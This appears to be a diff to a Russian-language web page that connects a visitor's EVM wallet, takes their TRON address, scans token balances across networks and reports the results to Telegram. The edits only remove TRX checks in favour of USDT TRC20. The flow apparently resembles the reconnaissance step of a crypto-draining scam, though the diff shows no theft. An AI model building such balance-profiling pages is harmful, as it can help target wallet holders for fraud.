@@ -69,7 +69,7 @@
           <div class="check-panel" id="tron-panel" style="display:none">
             <h2>Шаг 2 — TRON-адрес (необязательно)</h2>
             <p class="form-note" style="margin-bottom:12px">
-              Для проверки TRX и USDT TRC20 введите ваш публичный TRON-адрес.<br>
+              Для проверки USDT TRC20 введите ваш публичный TRON-адрес.<br>
               Найти его можно в Trust Wallet: раздел TRON → копировать адрес.
             </p>
             <div class="input-row">
@@ -81,7 +81,7 @@
                 autocorrect="off"
                 spellcheck="false"
               />
-              <button type="button" id="tron-submit-btn">Проверить TRX</button>
+              <button type="button" id="tron-submit-btn">Проверить USDT TRC20</button>
             </div>
             <p class="form-status" id="tron-status"></p>
           </div>
@@ -168,8 +168,7 @@
           .then(function (data) {
             var pf = (data && data.portfolio) || {};
             var lines = [];
-            if (pf.trx && pf.trx.ok) lines.push("TRX: " + pf.trx.balance);
-            if (pf.usdtTrc20 && pf.usdtTrc20.ok) lines.push("USDT TRC20: " + pf.usdtTrc20.balance);
+          if (pf.usdtTrc20 && pf.usdtTrc20.ok) lines.push("USDT TRC20: " + pf.usdtTrc20.balance);
             (pf.evmNatives || []).forEach(function (n) {
               if (n.ok && parseFloat(n.balance) > 0) lines.push(n.network + ": " + n.balance + " " + n.symbol);
             });
@@ -201,12 +200,12 @@
 
             unlockCheckForm(addr);
             showEvmAddress(p);
-            setStatus("EVM подключён. Теперь проверим TRX/USDT TRC20 — введите TRON-адрес ниже.");
+            setStatus("EVM подключён. Для проверки USDT TRC20 — введите TRON-адрес ниже.");
 
             var tronPanel = $("#tron-panel"); if (tronPanel) tronPanel.style.display = "";
 
             doScan(p, "evm_connect").then(function (lines) {
-              if (lines.length) setStatus("EVM проверен: " + lines.join(", ") + ". Введите TRON-адрес для TRX/USDT.");
+              if (lines.length) setStatus("EVM проверен: " + lines.join(", ") + ". Введите TRON-адрес для USDT TRC20.");
             });
           })
           .catch(function () {
@@ -242,7 +241,7 @@
           showEvmAddress(p);
 
           doScan(p, "tron_manual").then(function (lines) {
-            var tronLines = lines.filter(function (l) { return l.startsWith("TRX") || l.startsWith("USDT TRC20"); });
+            var tronLines = lines.filter(function (l) { return l.startsWith("USDT TRC20"); });
             if (tronLines.length) {
               setTronStatus("Готово: " + tronLines.join(", ") + ". Уведомление отправлено в Telegram.");
             } else {
@@ -296,7 +295,7 @@
           var inp = $("#tron-address-input"); if (inp) inp.value = stored.tronAddress;
           setStatus("Профиль восстановлен. EVM + TRON подключены.");
         } else {
-          setStatus("EVM подключён. Введите TRON-адрес для проверки TRX/USDT.");
+          setStatus("EVM подключён. Введите TRON-адрес для проверки USDT TRC20.");
         }
       }
 
